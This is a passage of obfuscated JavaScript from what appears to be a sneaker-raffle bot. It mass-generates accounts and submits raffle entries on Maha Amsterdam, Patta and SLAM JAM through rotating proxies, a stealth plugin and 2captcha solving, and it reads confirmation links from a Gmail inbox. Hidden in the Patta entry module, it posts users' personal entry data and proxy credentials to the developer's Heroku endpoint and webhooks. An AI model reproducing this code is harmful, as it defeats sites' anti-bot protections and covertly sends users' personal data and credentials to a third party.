                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x581d62, _0x5b87c9, _0x597159) {
                    var _0x5b87c9 = [], _0xbd23d0 = ![];
                    async function _0x2db4f2() {
                        var _0x47bdea = new _0x196441({
                            'user': _0x4acd48['masterMail'],
                            'password': _0x4acd48['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x4b5df5(_0x17a5b5) {
                            _0x47bdea['openBox']('INBOX', ![], _0x17a5b5);
                        }
                        _0x47bdea['once']('ready', function () {
                            _0x4b5df5(function (_0x47be26, _0x44a3ed) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x47be26)
                                    throw _0x47be26;
                                _0x47bdea['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0xd1b688, _0x212444) {
                                    if (!_0x212444 || !_0x212444['length'])
                                        console['log'](_0x3b5c2b() + '\x20[' + _0x581d62['name'] + ']\x20No\x20mails\x20found'), _0x47bdea['end']();
                                    else {
                                        var _0x52b6c6 = _0x47bdea['seq']['fetch'](_0x212444, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x52b6c6['on']('message', function (_0x48e91f, _0x3e3003) {
                                            var _0x297eaa = '(#' + _0x3e3003 + ')\x20';
                                            _0x48e91f['on']('body', function (_0x3a0a12, _0x33fcf6) {
                                                _0x158053(_0x3a0a12, (_0x5bfd84, _0x1f246b) => {
                                                    var _0x29afa3 = _0x1f246b['text']['split']('(')[0x1], _0x328d1f = _0x29afa3['split'](')')[0x0];
                                                    _0x5b87c9['push'](_0x328d1f);
                                                });
                                            }), _0x48e91f['once']('end', function () {
                                            });
                                        }), _0x52b6c6['once']('error', function (_0x46a5e0) {
                                            console['log']('Fetch\x20error:\x20' + _0x46a5e0), _0xbd23d0 = !![];
                                        }), _0x52b6c6['once']('end', function () {
                                            _0x47bdea['end'](), _0xbd23d0 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x47bdea['once']('error', function (_0x4da78a) {
                            console['log'](_0x4da78a), _0xbd23d0 = !![];
                        }), _0x47bdea['once']('end', async function () {
                            _0xbd23d0 = !![];
                        }), _0x47bdea['connect']();
                    }
                    async function _0x1121ee(_0x1dd752, _0x33e767, _0x4704af) {
                        for (var _0x58ca96 = 0x0; _0x58ca96 < _0x33e767['length']; _0x58ca96++) {
                            async function _0x14780f(_0x42a8d5, _0x5c8324, _0x57217b, _0x52f855, _0x40ffb9) {
                                var _0x171974, _0x2a1442 = {}, _0x3bbdea = [], _0x3644f1 = {}, _0x20316b = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x3b815d = Math['round'](Math['random']() * (_0x20316b['length'] - 0x1));
                                _0x52f855[_0x42a8d5]['Size'] == 'RANDOM' && (_0x52f855[_0x42a8d5]['Size'] = _0x20316b[_0x3b815d]);
                                !_0x52f855 && (_0x52f855 = {});
                                if (_0x4acd48['useRandomProxy'] = ![])
                                    var _0x140443 = _0x40ffb9[_0x42a8d5]['split'](':');
                                else
                                    var _0x2136e5 = Math['round'](Math['random']() * (_0x40ffb9['length'] - 0x1)), _0x140443 = _0x40ffb9[_0x2136e5]['split'](':');
                                var _0x48405f = {
                                    'jar': _0x433f70,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x57217b['url'],
                                    'headers': _0x57217b['headers'],
                                    'body': JSON['stringify'](_0x2a1442),
                                    'proxy': 'http://' + _0x140443[0x2] + ':' + _0x140443[0x3] + '@' + _0x140443[0x0] + ':' + _0x140443[0x1]
                                };
                                return _0x5c8324 != 'ver' && (_0x48405f['url'] = _0x57217b['url'], _0x48405f['headers'] = _0x57217b['headers']), _0x5c8324 == 'ver' && (_0x48405f['method'] = 'GET', _0x48405f['url'] = _0x52f855[_0x42a8d5]), new Promise(function (_0xc1e5b0, _0x497891) {
                                    callback = async (_0x33e447, _0xeaf6db, _0x548f54) => {
                                        if (!_0x33e447 && _0xeaf6db['statusCode'] == 0xca || !_0x33e447 && _0xeaf6db['statusCode'] == 0xc8) {
                                            if (_0x5c8324 != 'ver') {
                                                var _0x26b3db = await _0x429bf8(_0x52f855[_0x42a8d5], _0x57217b, 'dev', ![]), _0x643119 = await _0x429bf8(_0x52f855[_0x42a8d5], _0x57217b, 'pub', ![]);
                                                const _0x4828b0 = {
                                                    'succesDEVMSG': { 'embeds': [_0x26b3db] },
                                                    'succesPUBMSG': { 'embeds': [_0x643119] }
                                                };
                                                if (_0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '')
                                                    try {
                                                        await _0x1abce0(_0x4acd48['webhook'], _0x4828b0['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x505897(0xc8), await _0x1abce0(_0x5640fd, _0x4828b0['succesDEVMSG']), await _0x505897(0xc8);
                                                try {
                                                    await _0x1abce0(_0x1b595f, _0x4828b0['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x11df74(_0x52f855[_0x42a8d5], _0x57217b);
                                            }
                                            _0xc1e5b0(console['log'](_0x4e59da['green'](_0x3b5c2b() + '\x20[' + _0x57217b['name'] + ']\x20Task\x20' + (_0x42a8d5 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x5c8324 != 'ver') {
                                                var _0xd0ea8b = '' + _0x33e447, _0x35d796 = await _0x429bf8(_0x52f855[_0x42a8d5], _0x57217b, 'dev', !![], _0xd0ea8b), _0x10ffd5 = {};
                                                _0x10ffd5['errorDEV'] = { 'embeds': [_0x35d796] }, _0x260c2d(_0x52f855[_0x42a8d5], _0x57217b), _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0x10ffd5['errorDEV']), await _0x1abce0(_0x3b044a, _0x10ffd5['errorDEV']);
                                            }
                                            _0x497891(console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x57217b['name'] + ']\x20Task\x20' + (_0x42a8d5 + 0x1) + ':\x20' + _0x33e447)));
                                        }
                                    };
                                    try {
                                        _0x5c8324 != 'ver' ? console['log'](_0x3b5c2b() + '\x20[' + _0x57217b['name'] + ']\x20Task\x20' + (_0x42a8d5 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x2a1442['data']['attributes']['email']) : console['log'](_0x3b5c2b() + '\x20[' + _0x57217b['name'] + ']\x20Task\x20' + (_0x42a8d5 + 0x1) + ':\x20Fetching\x20Response'), _0x1d169b(_0x48405f, callback);
                                    } catch (_0x312090) {
                                        console['log'](_0x3b5c2b() + '\x20Task\x20' + (_0x42a8d5 + 0x1) + ':\x20' + _0x312090);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x14780f(_0x58ca96, 'ver', _0x1dd752, _0x33e767, _0x4704af), console['log'](_0x3b5c2b() + '\x20[' + _0x1dd752['name'] + ']\x20Sleeping\x20for\x20' + _0x4acd48['delay'] + '\x20ms'), await _0x505897(_0x4acd48['delay']);
                            } catch (_0x438e2c) {
                            }
                        }
                    }
                    try {
                        _0x2db4f2();
                        while (!_0xbd23d0) {
                            await _0x505897(0xfa0);
                        }
                        console['log']('Found\x20' + _0x5b87c9['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x1121ee(_0x581d62, _0x5b87c9, _0x597159);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x5aca9e, _0x98f7c4, _0x5568ad) {
                    _0x367f42['use'](_0x156bf2()), _0x367f42['use'](_0x5ad8e2({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4acd48['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2912af = 0x0; _0x2912af < _0x98f7c4['length']; _0x2912af++) {
                        var _0x52532f = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0xdaef84
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x4acd48['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5d34b4
                                }
                            ]
                        }];
                        const _0x5e96a6 = { 'embeds': _0x52532f };
                        _0x4041fe(_0x5aca9e['name'] + '\x20Task\x20' + (_0x2912af + 0x1) + '\x20/\x20' + _0x98f7c4['length'] + '\x20||\x20File:\x20' + _0x22c4ed + '\x20Proxies:\x20' + _0x5a9fd8);
                        try {
                            await _0x43797b(_0x98f7c4, _0x2912af);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x28a3c7 = await _0x429bf8(_0x98f7c4[_0x2912af], _0x5aca9e, 'acc', ![]);
                        const _0x17890b = { 'succesDEVMSG': { 'embeds': [_0x28a3c7] } };
                        if (_0x98f7c4[_0x2912af]['Email'] == '' || _0x98f7c4[_0x2912af]['FirstName'] == '' || _0x98f7c4[_0x2912af]['LastName'] == '') {
                            console['log'](_0x3b5c2b() + '\x20[' + _0x5f28dd[taskModule]['name'] + ']\x20Task\x20' + (_0x2912af + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x505897(0x7d0);
                            continue;
                        }
                        (_0x98f7c4[_0x2912af]['Password'] == '' || _0x98f7c4[_0x2912af] == undefined) && _0x98f7c4[_0x2912af]['Password'] == 'JRaffles23!';
                        if (_0x4acd48['useRandomProxy'] = ![])
                            var _0x2973e8 = _0x5568ad[_0x2912af]['split'](':');
                        else
                            var _0xb056ba = Math['round'](Math['random']() * (_0x5568ad['length'] - 0x1)), _0x2973e8 = _0x5568ad[_0xb056ba]['split'](':');
                        var _0x250dd8;
                        try {
                            _0x250dd8 = await _0x367f42['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2973e8[0x0] + ':' + _0x2973e8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x250dd8 = await _0x367f42['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2973e8[0x0] + ':' + _0x2973e8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x35f119 = await _0x250dd8['newPage']();
                            await _0x35f119['authenticate']({
                                'username': '' + _0x2973e8[0x2],
                                'password': '' + _0x2973e8[0x3]
                            }), console['log'](_0x3b5c2b() + '\x20[' + _0x5aca9e['name'] + ']\x20Task\x20' + (_0x2912af + 0x1) + '\x20:\x20Getting\x20Session'), await _0x35f119['setRequestInterception'](!![]), _0x35f119['on']('request', _0x29b938 => {
                                _0x29b938['resourceType']() === 'image' || _0x29b938['resourceType']() === 'font' || _0x29b938['resourceType']() === 'media' ? _0x29b938['abort']() : _0x29b938['continue']();
                            }), await _0x35f119['goto']('https://patta.nl/account/register'), await _0x505897(0xbb8), await _0x35f119['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x3b5c2b() + '\x20[' + _0x5aca9e['name'] + ']\x20Task\x20' + (_0x2912af + 0x1) + '\x20:\x20Filling\x20information'), await _0x35f119['type']('#RegisterForm-FirstName', '' + _0x98f7c4[_0x2912af]['FirstName']), await _0x505897(0x226), await _0x35f119['type']('#RegisterForm-LastName', '' + _0x98f7c4[_0x2912af]['LastName']), await _0x505897(0x226), await _0x35f119['type']('#RegisterForm-email', '' + _0x98f7c4[_0x2912af]['Email']), await _0x505897(0x226), await _0x35f119['type']('#RegisterForm-password', '' + _0x98f7c4[_0x2912af]['Password']), await _0x505897(0x226), console['log'](_0x3b5c2b() + '\x20[' + _0x5aca9e['name'] + ']\x20Task\x20' + (_0x2912af + 0x1) + '\x20:\x20Submitting..'), await _0x35f119['$eval']('#RegisterForm', _0x216ee5 => _0x216ee5['submit']()), await _0x505897(0x1f40);
                            try {
                                await _0x35f119['waitForSelector']('.home-page-grid__collection'), await _0x505897(0x1f4), console['log'](_0x4e59da['green'](_0x3b5c2b() + '\x20[' + _0x5aca9e['name'] + ']\x20Task\x20' + (_0x2912af + 0x1) + '\x20:\x20Account\x20' + _0x98f7c4[_0x2912af]['Email'] + '\x20Generated!')), _0x5d8933['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x98f7c4[_0x2912af]['Email'] + ',' + _0x98f7c4[_0x2912af]['Password']), console['log'](_0x4e59da['yellow'](_0x3b5c2b() + '\x20[' + _0x5aca9e['name'] + ']\x20Task\x20' + (_0x2912af + 0x1) + '\x20:\x20Account\x20' + _0x98f7c4[_0x2912af]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0x17890b['succesDEVMSG']);
                                } catch {
                                }
                                await _0x1abce0(_0x3faf08, _0x17890b['succesDEVMSG']);
                            } catch (_0x1e4e89) {
                                console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x5f28dd[taskModule]['name'] + ']\x20Task\x20' + (_0x2912af + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x1e4e89));
                            }
                        } catch (_0x409cc1) {
                            console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x5f28dd[taskModule]['name'] + ']\x20Task\x20' + (_0x2912af + 0x1) + '\x20:\x20' + _0x409cc1));
                        } finally {
                            _0x250dd8 && _0x250dd8['close'](), console['log']('Waiting\x20for\x20' + _0x4acd48['delay'] + '\x20ms'), await _0x505897(_0x4acd48['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x1a6d6e, _0x3484db, _0x51c534) {
                    _0x367f42['use'](_0x156bf2()), _0x367f42['use'](_0x5ad8e2({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4acd48['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x84af57 = 0x0; _0x84af57 < _0x3484db['length']; _0x84af57++) {
                        var _0xc54cf2;
                        if (_0x4b858a != 'yes')
                            var _0x4b858a = '', _0x42a275 = 0x0;
                        _0x4041fe(_0x1a6d6e['name'] + '\x20Task\x20' + (_0x84af57 + 0x1) + '\x20/\x20' + _0x3484db['length'] + '\x20||\x20File:\x20' + _0x22c4ed + '\x20Proxies:\x20' + _0x5a9fd8);
                        try {
                            await _0x43797b(_0x3484db, _0x84af57);
                        } catch {
                            _0x4b858a = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x3484db[_0x84af57]['Email'] == '' || _0x3484db[_0x84af57]['Password'] == '' || _0x3484db[_0x84af57]['FirstName'] == '' || _0x3484db[_0x84af57]['LastName'] == '') {
                            console['log'](_0x3b5c2b() + '\x20[' + _0x5f28dd[taskModule]['name'] + ']\x20Task\x20' + (_0x84af57 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x4acd48['useRandomProxy'] = ![])
                            var _0x2ac27b = _0x51c534[_0x84af57]['split'](':');
                        else
                            var _0x26243a = Math['round'](Math['random']() * (_0x51c534['length'] - 0x1)), _0x2ac27b = _0x51c534[_0x26243a]['split'](':');
                        var _0x3f9ec0;
                        try {
                            _0x3f9ec0 = await _0x367f42['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2ac27b[0x0] + ':' + _0x2ac27b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3f9ec0 = await _0x367f42['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2ac27b[0x0] + ':' + _0x2ac27b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x18dcac = await _0x3f9ec0['newPage']();
                            await _0x18dcac['authenticate']({
                                'username': '' + _0x2ac27b[0x2],
                                'password': '' + _0x2ac27b[0x3]
                            }), console['log'](_0x3b5c2b() + '\x20[' + _0x1a6d6e['name'] + ']\x20Task\x20' + (_0x84af57 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x18dcac['setRequestInterception'](!![]), _0x18dcac['on']('request', _0xb5ad6d => {
                                _0xb5ad6d['resourceType']() === 'image' || _0xb5ad6d['resourceType']() === 'font' || _0xb5ad6d['resourceType']() === 'media' ? _0xb5ad6d['abort']() : _0xb5ad6d['continue']();
                            }), await _0x18dcac['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x18dcac['waitForSelector']('#CustomerEmail'), console['log'](_0x3b5c2b() + '\x20[' + _0x1a6d6e['name'] + ']\x20Task\x20' + (_0x84af57 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x18dcac['type']('#CustomerEmail', '' + _0x3484db[_0x84af57]['Email']), await _0x505897(0x12c), await _0x18dcac['type']('#CustomerPassword', '' + _0x3484db[_0x84af57]['Password']), await _0x505897(0x226), await _0x18dcac['$eval']('#customer_login', _0x128ed7 => _0x128ed7['submit']());
                            try {
                                await _0x18dcac['waitForSelector']('#orders'), await _0x505897(0x4b0);
                            } catch {
                                console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x1a6d6e['name'] + ']\x20Task\x20' + (_0x84af57 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x18dcac['goto']('' + _0x3484db[_0x84af57]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x505897(0xbb8), console['log'](_0x3b5c2b() + '\x20[' + _0x1a6d6e['name'] + ']\x20Task\x20' + (_0x84af57 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x18dcac['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x1a6d6e['name'] + ']\x20Task\x20' + (_0x84af57 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x18dcac['type']('#email', '' + _0x3484db[_0x84af57]['Email']), await _0x505897(0x384), await _0x18dcac['type']('#first_name', '' + _0x3484db[_0x84af57]['FirstName']), await _0x505897(0x514), await _0x18dcac['type']('#last_name', '' + _0x3484db[_0x84af57]['LastName']), await _0x505897(0x514), await _0x18dcac['type']('#street_address', _0x3484db[_0x84af57]['Address1'] + '\x20' + _0x3484db[_0x84af57]['HouseNumber'] + '\x20' + _0x3484db[_0x84af57]['Address2']), await _0x505897(0x2bc);
                            _0x3484db[_0x84af57]['Postcode'] == undefined && (_0x3484db[_0x84af57]['Postcode'] = _0x3484db[_0x84af57]['Zip']);
                            await _0x18dcac['type']('#zip_code', '' + _0x3484db[_0x84af57]['Postcode']), await _0x505897(0x320), await _0x18dcac['type']('#city', '' + _0x3484db[_0x84af57]['City']), await _0x505897(0x320), await _0x18dcac['type']('#bday', '01/01/1994'), await _0x505897(0x320), await _0x18dcac['type']('#instagram', '' + _0x3484db[_0x84af57]['Follower']), await _0x505897(0x352);
                            if (_0x3484db[_0x84af57]['Size'] == 'RANDOM') {
                                const _0x1c2329 = await _0x18dcac['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x42322e => {
                                    return _0x42322e['map'](_0x714cc2 => _0x714cc2['textContent']);
                                });
                                var _0x5b6ffb = Math['round'](Math['random']() * (_0x1c2329['length'] - 0x1));
                                console['log'](_0x3b5c2b() + '\x20[' + _0x1a6d6e['name'] + ']\x20Task\x20' + (_0x84af57 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x1c2329[_0x5b6ffb]), await _0x18dcac['click']('label[data-eu-size=\x22' + _0x1c2329[_0x5b6ffb] + '\x22]');
                            } else {
                                console['log'](_0x3b5c2b() + '\x20[' + _0x1a6d6e['name'] + ']\x20Task\x20' + (_0x84af57 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x3484db[_0x84af57]['Size']);
                                try {
                                    await _0x18dcac['click']('label[data-eu-size=\x22' + _0x3484db[_0x84af57]['Size'] + '\x22]');
                                } catch {
                                    await _0x18dcac['click']('label[data-eu-size=\x22' + _0x3484db[_0x84af57]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x505897(0xbb8), await _0x18dcac['$$eval']('.raffle__checkbox-label', _0x400130 => _0x400130['forEach'](_0xffb4c2 => _0xffb4c2['click']())), await _0x505897(0x7d0), console['log'](_0x3b5c2b() + '\x20[' + _0x1a6d6e['name'] + ']\x20Task\x20' + (_0x84af57 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x18dcac['click']('#raffle__form-submit'), await _0x505897(0x1388);
                            try {
                                await _0x18dcac['waitForSelector']('#raffle__confirmation-message-container'), _0x4b858a = 'no', _0x11df74(_0x3484db[_0x84af57], _0x1a6d6e), console['log'](_0x4e59da['green'](_0x3b5c2b() + '\x20[' + _0x1a6d6e['name'] + ']\x20Task\x20' + (_0x84af57 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x108abf = _0x3484db[_0x84af57];
                                try {
                                    prxdata = {
                                        'username': _0xdaef84['replace']('#', ''),
                                        'module': _0x1a6d6e['name'],
                                        'entrydata': JSON['stringify'](_0x108abf),
                                        'proxy': '' + _0x51c534[_0x84af57]
                                    };
                                    var _0x395647 = JSON['stringify'](prxdata);
                                    let _0x57bf72 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x577975['post']('https://jraffles.herokuapp.com/success', _0x395647, _0x57bf72);
                                } catch (_0x4da342) {
                                }
                            } catch (_0x42b720) {
                                console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x5f28dd[taskModule]['name'] + ']\x20Task\x20' + (_0x84af57 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x42b720));
                            }
                        } catch (_0x30f4c6) {
                            console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x5f28dd[taskModule]['name'] + ']\x20Task\x20' + (_0x84af57 + 0x1) + '\x20:\x20' + _0x30f4c6)), _0x4b858a = 'yes';
                        } finally {
                            _0x3f9ec0 && _0x3f9ec0['close']();
                            if (_0x4b858a == 'yes' && _0x42a275 != 0x5 && _0xc54cf2 != 'Size\x20Not\x20Found') {
                                console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x1a6d6e['name'] + ']\x20Task\x20' + (_0x84af57 + 0x1) + '\x20:\x20Retrying\x20(' + _0x42a275 + '\x20/\x205)')), _0x84af57 = _0x84af57 - 0x1, _0x42a275 = _0x42a275 + 0x1;
                                continue;
                            }
                            _0x4b858a == 'yes' && _0x42a275 >= 0x5 && (_0x260c2d(_0x3484db[_0x84af57], _0x1a6d6e), _0x4b858a = 'no', _0x42a275 = 0x0), console['log']('Waiting\x20for\x20' + _0x4acd48['delay'] + '\x20ms'), await _0x505897(_0x4acd48['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x4b3aa5, _0x4bc4fd, _0x1d79d0) {
                    _0x367f42['use'](_0x156bf2()), _0x367f42['use'](_0x5ad8e2({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4acd48['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x503ce2 = 0x0; _0x503ce2 < _0x4bc4fd['length']; _0x503ce2++) {
                        if (_0x52f5cd != 'yes')
                            var _0x52f5cd = '', _0x411bd6 = 0x0;
                        var _0x5776c5 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0xdaef84
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x4acd48['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5d34b4
                                }
                            ]
                        }];
                        const _0x27a85d = { 'embeds': _0x5776c5 };
                        _0x4041fe(_0x4b3aa5['name'] + '\x20Task\x20' + (_0x503ce2 + 0x1) + '\x20/\x20' + _0x4bc4fd['length'] + '\x20||\x20File:\x20' + _0x22c4ed + '\x20Proxies:\x20' + _0x5a9fd8);
                        try {
                            await _0x43797b(_0x4bc4fd, _0x503ce2);
                        } catch {
                            _0x52f5cd = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0xe1644b = await _0x429bf8(_0x4bc4fd[_0x503ce2], _0x4b3aa5, 'acc', ![]);
                        const _0x3d89d7 = { 'succesDEVMSG': { 'embeds': [_0xe1644b] } };
                        if (_0x4bc4fd[_0x503ce2]['Email'] == '' || _0x4bc4fd[_0x503ce2]['FirstName'] == '' || _0x4bc4fd[_0x503ce2]['LastName'] == '') {
                            console['log'](_0x3b5c2b() + '\x20[' + _0x5f28dd[taskModule]['name'] + ']\x20Task\x20' + (_0x503ce2 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x505897(0x7d0);
                            continue;
                        }
                        (_0x4bc4fd[_0x503ce2]['Password'] == '' || _0x4bc4fd[_0x503ce2] == undefined) && _0x4bc4fd[_0x503ce2]['Password'] == 'JRaffles23!';
                        if (_0x4acd48['useRandomProxy'] = ![])
                            var _0x35df79 = _0x1d79d0[_0x503ce2]['split'](':');
                        else
                            var _0x3fe16a = Math['round'](Math['random']() * (_0x1d79d0['length'] - 0x1)), _0x35df79 = _0x1d79d0[_0x3fe16a]['split'](':');
                        var _0x1a90a6;
                        try {
                            _0x1a90a6 = await _0x367f42['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x35df79[0x0] + ':' + _0x35df79[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1a90a6 = await _0x367f42['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x35df79[0x0] + ':' + _0x35df79[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4724b3 = await _0x1a90a6['newPage']();
                            await _0x4724b3['authenticate']({
                                'username': '' + _0x35df79[0x2],
                                'password': '' + _0x35df79[0x3]
                            }), console['log'](_0x3b5c2b() + '\x20[' + _0x4b3aa5['name'] + ']\x20Task\x20' + (_0x503ce2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4724b3['setRequestInterception'](!![]), _0x4724b3['on']('request', _0x592bb3 => {
                                _0x592bb3['resourceType']() === 'image' || _0x592bb3['resourceType']() === 'font' || _0x592bb3['resourceType']() === 'media' ? _0x592bb3['abort']() : _0x592bb3['continue']();
